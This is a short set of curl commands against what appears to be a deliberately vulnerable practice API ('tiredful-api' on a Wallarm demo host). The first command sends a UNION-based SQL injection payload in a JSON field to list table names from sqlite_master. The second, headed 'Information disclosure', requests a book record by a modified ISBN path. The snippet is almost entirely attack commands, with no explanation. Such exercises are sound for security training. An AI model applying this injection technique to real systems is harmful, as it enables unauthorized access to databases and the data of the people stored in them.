

curl "http://tiredful-api.wallarm-demo.com/api/v1/activities/" -d'{"month": "1 UNION SELECT 1,2,3,4,5,6,name FROM sqlite_master"}' -H "Accept: application/json" -H "Content-Type: application/json" -v


# Information disclosure

curl http://tiredful-api.wallarm-demo.com/api/v1/books/978-93-80658-74-2-A/

